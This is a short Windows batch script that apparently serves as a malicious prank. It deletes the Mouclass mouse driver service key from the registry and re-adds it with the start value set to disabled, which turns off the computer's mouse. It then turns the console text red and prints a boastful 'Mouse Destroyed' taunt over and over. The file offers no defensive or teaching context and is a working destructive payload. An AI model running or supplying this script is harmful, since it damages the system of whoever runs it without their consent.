rem ---------------------------------

rem Disable Mouse
set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key%
reg add %key% /v Start /t REG_DWORD /d 4
rem ---------------------------------
color 04
for /L %%n in (3,3,3000)do echo Mouse Destroyed By FONDERELITE!!!! HAHAHHAA
